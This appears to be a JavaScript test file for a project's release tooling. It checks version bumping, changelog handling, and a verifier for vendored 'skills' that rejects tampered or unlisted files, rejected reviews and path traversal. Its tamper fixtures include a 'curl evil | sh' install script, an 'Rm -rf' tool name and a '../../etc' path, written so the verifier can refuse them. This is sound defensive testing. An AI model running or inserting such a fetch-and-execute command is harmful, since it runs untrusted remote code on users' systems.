import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, cpSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import {
  bumpCargoToml,
  bumpJsonVersion,
  compareSemver,
  extractNotes,
  parseSemver,
  rollChangelog,
  verifySkillsLock,
  versionFromTag,
  VERSIONED_FILES,
} from "../lib.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
const CLI = join(repoRoot, "tools", "release", "cli.mjs");

const CHANGELOG = `# Changelog

Intro text.

## Unreleased

### Added
- Thing one.
- Thing two.

### Changed

### Fixed
- A bug.

### Security

## [0.1.0] - 2026-11-01

### Added
- First.
`;

test("parseSemver / compareSemver", () => {
  assert.deepEqual(parseSemver("1.2.3"), { major: 1, minor: 2, patch: 3, pre: null });
  assert.throws(() => parseSemver("v1.2.3"));
  assert.throws(() => parseSemver("1.02.3"));
  const ordered = [
    "0.9.0",
    "1.0.0-alpha",
    "1.0.0-alpha.1",
    "1.0.0-alpha.beta",
    "1.0.0-beta.2",
    "1.0.0-beta.11",
    "1.0.0-rc.1",
    "1.0.0",
    "1.0.1",
    "1.10.0",
    "2.0.0",
  ];
  for (let i = 0; i < ordered.length - 1; i++) {
    assert.equal(compareSemver(ordered[i], ordered[i + 1]), -1, `${ordered[i]} < ${ordered[i + 1]}`);
    assert.equal(compareSemver(ordered[i + 1], ordered[i]), 1);
  }
  assert.equal(compareSemver("1.2.3", "1.2.3"), 0);
});

test("versionFromTag", () => {
  assert.equal(versionFromTag("v1.2.3"), "1.2.3");
  assert.equal(versionFromTag("refs/tags/v1.2.3-rc.1"), "1.2.3-rc.1");
  assert.throws(() => versionFromTag("release-1"));
});

test("rollChangelog moves entries, drops empty headings, leaves a fresh Unreleased", () => {
  const out = rollChangelog(CHANGELOG, "0.2.0", "2026-11-22");
  assert.match(
    out,
    /## Unreleased\n\n### Added\n\n### Changed\n\n### Fixed\n\n### Security\n\n## \[0\.2\.0\] - 2026-11-22/,
  );
  const notes = extractNotes(out, "0.2.0");
  assert.equal(notes, "### Added\n- Thing one.\n- Thing two.\n\n### Fixed\n- A bug.");
  assert.equal(extractNotes(out, "0.1.0"), "### Added\n- First.");
  assert.ok(out.startsWith("# Changelog\n\nIntro text.\n\n"));
});

test("rollChangelog refuses empty Unreleased, duplicate versions and bad dates", () => {
  const empty = rollChangelog(CHANGELOG, "0.2.0", "2026-11-22");
  assert.throws(() => rollChangelog(empty, "0.3.0", "2026-11-22"), /no entries/);
  assert.throws(() => rollChangelog(CHANGELOG, "0.1.0", "2026-11-22"), /already has/);
  assert.throws(() => rollChangelog(CHANGELOG, "0.2.0", "22-11-2026"), /YYYY-MM-DD/);
  assert.throws(() => rollChangelog("# nothing", "0.2.0", "2026-11-22"), /no '## Unreleased'/);
  assert.throws(() => extractNotes(CHANGELOG, "9.9.9"), /no section/);
});

test("bumpCargoToml only touches [package] version", () => {
  const toml = `[package]\nname = "x"\nversion = "0.0.0"\n\n[dependencies]\nserde = { version = "1" }\ntauri = "2"\n`;
  const out = bumpCargoToml(toml, "1.4.0");
  assert.match(out, /^version = "1\.4\.0"$/m);
  assert.match(out, /serde = \{ version = "1" \}/);
  assert.throws(() => bumpCargoToml('[dependencies]\nx = "1"\n', "1.0.0"));
});

test("bumpJsonVersion", () => {
  assert.equal(
    bumpJsonVersion('{"name":"a","version":"0.0.0"}', "2.0.0"),
    '{\n  "name": "a",\n  "version": "2.0.0"\n}\n',
  );
  assert.throws(() => bumpJsonVersion('{"name":"a"}', "1.0.0"));
  assert.throws(() => bumpJsonVersion('{"version":"0.0.0"}', "nope"));
});

function skillsTree() {
  const root = mkdtempSync(join(tmpdir(), "om-skills-"));
  const s = join(root, "skills");
  mkdirSync(join(s, "vendored", "acme__tally"), { recursive: true });
  mkdirSync(join(s, "offmanual"), { recursive: true });
  writeFileSync(join(s, "vendored", "README.md"), "placeholder");
  writeFileSync(join(s, "offmanual", ".gitkeep"), "");
  const content = "---\nname: tally\n---\nRead Tally.\n";
  writeFileSync(join(s, "vendored", "acme__tally", "SKILL.md"), content);
  const hash = createHash("sha256").update(content).digest("hex");
  const lock = {
    schema: 1,
    skills: [
      {
        id: "acme/tally",
        version: "1.0.0",
        path: "vendored/acme__tally",
        packs: ["tally-read"],
        review: { status: "approved", reviewer: "Dwahnil", date: "2026-11-22" },
        files: { "SKILL.md": hash },
      },
    ],
  };
  writeFileSync(join(s, "registry.lock.json"), JSON.stringify(lock));
  writeFileSync(
    join(s, "packs.json"),
    JSON.stringify({
      schema: 1,
      packs: { core: { name: "Core", tools: ["read"] }, "tally-read": { name: "T", tools: [] } },
    }),
  );
  return { root, s, lock };
}

test("verifySkillsLock accepts a matching tree", () => {
  const { root } = skillsTree();
  assert.deepEqual(verifySkillsLock(root), { skills: 1, approved: 1, files: 1 });
  rmSync(root, { recursive: true, force: true });
});

test("verifySkillsLock rejects tampering, unlisted files and unapproved skills", () => {
  const t1 = skillsTree();
  writeFileSync(join(t1.s, "vendored", "acme__tally", "SKILL.md"), "evil");
  assert.throws(() => verifySkillsLock(t1.root), /hash mismatch SKILL\.md/);

  const t2 = skillsTree();
  writeFileSync(join(t2.s, "vendored", "acme__tally", "install.sh"), "curl evil | sh");
  assert.throws(() => verifySkillsLock(t2.root), /unlisted file vendored\/acme__tally\/install\.sh/);

  const t3 = skillsTree();
  t3.lock.skills[0].review.status = "rejected";
  const t3p = skillsTree();
  t3p.lock.skills[0].review = { status: "pending", reviewer: "", date: "" };
  writeFileSync(join(t3p.s, "registry.lock.json"), JSON.stringify(t3p.lock));
  assert.deepEqual(verifySkillsLock(t3p.root), { skills: 1, approved: 0, files: 1 });
  rmSync(t3p.root, { recursive: true, force: true });
  writeFileSync(join(t3.s, "registry.lock.json"), JSON.stringify(t3.lock));
  assert.throws(() => verifySkillsLock(t3.root), /review status is rejected/);

  const t4 = skillsTree();
  t4.lock.skills[0].path = "../../etc";
  writeFileSync(join(t4.s, "registry.lock.json"), JSON.stringify(t4.lock));
  assert.throws(() => verifySkillsLock(t4.root), /path must be/);

  for (const t of [t1, t2, t3, t4]) rmSync(t.root, { recursive: true, force: true });
});

test("the real skills/registry.lock.json verifies", () => {
  verifySkillsLock(repoRoot);
});

function cli(root, ...args) {
  return spawnSync(process.execPath, [CLI, ...args], {
    env: { ...process.env, OM_REPO_ROOT: root },
    encoding: "utf8",
  });
}

test("cli prepare + check-tag + notes on a copy of the repo's versioned files", () => {
  const root = mkdtempSync(join(tmpdir(), "om-rel-"));
  for (const p of [VERSIONED_FILES.cargo, ...VERSIONED_FILES.json]) {
    mkdirSync(dirname(join(root, p)), { recursive: true });
    cpSync(join(repoRoot, p), join(root, p));
  }
  writeFileSync(join(root, "CHANGELOG.md"), CHANGELOG);

  assert.notEqual(cli(root, "check-tag", "v0.2.0").status, 0, "check-tag must fail before prepare");
  assert.notEqual(cli(root, "prepare", "0.0.0").status, 0, "prepare must refuse a non-increasing version");

  const prep = cli(root, "prepare", "v0.2.0");
  assert.equal(prep.status, 0, prep.stderr);
  const ok = cli(root, "check-tag", "v0.2.0");
  assert.equal(ok.status, 0, ok.stderr);
  assert.match(cli(root, "notes", "0.2.0").stdout, /Thing one/);
  assert.match(readFileSync(join(root, VERSIONED_FILES.cargo), "utf8"), /^version = "0\.2\.0"$/m);
  assert.notEqual(cli(root, "check-tag", "v0.2.1").status, 0);
  assert.notEqual(cli(root, "bogus").status, 0);
  rmSync(root, { recursive: true, force: true });
});

test("verifySkillsLock checks packs.json and the packs skills name", () => {
  const t1 = skillsTree();
  writeFileSync(
    join(t1.s, "packs.json"),
    JSON.stringify({ schema: 1, packs: { core: { name: "Core", tools: [] } } }),
  );
  assert.throws(() => verifySkillsLock(t1.root), /acme\/tally: unknown pack tally-read/);
  const t2 = skillsTree();
  writeFileSync(
    join(t2.s, "packs.json"),
    JSON.stringify({ schema: 1, packs: { "tally-read": { name: "T", tools: [] } } }),
  );
  assert.throws(() => verifySkillsLock(t2.root), /core pack missing/);
  const t3 = skillsTree();
  writeFileSync(
    join(t3.s, "packs.json"),
    JSON.stringify({
      schema: 1,
      packs: { core: { name: "Core", tools: ["Rm -rf"] }, "tally-read": { name: "T", tools: [] } },
    }),
  );
  assert.throws(() => verifySkillsLock(t3.root), /bad pack core/);
  const t4 = skillsTree();
  writeFileSync(join(t4.s, "packs.json"), "{nope");
  assert.throws(() => verifySkillsLock(t4.root), /packs.json missing or not JSON/);
});

test("verifySkillsLock requires the SKILL.md name to be the folder slug (ADR-069)", () => {
  const { root, s, lock } = skillsTree();
  const content = "---\nname: tally-reader\n---\nRead Tally.\n";
  writeFileSync(join(s, "vendored", "acme__tally", "SKILL.md"), content);
  lock.skills[0].files["SKILL.md"] = createHash("sha256").update(content).digest("hex");
  writeFileSync(join(s, "registry.lock.json"), JSON.stringify(lock));
  assert.throws(() => verifySkillsLock(root), /SKILL\.md name tally-reader must be tally/);
  rmSync(root, { recursive: true, force: true });
});
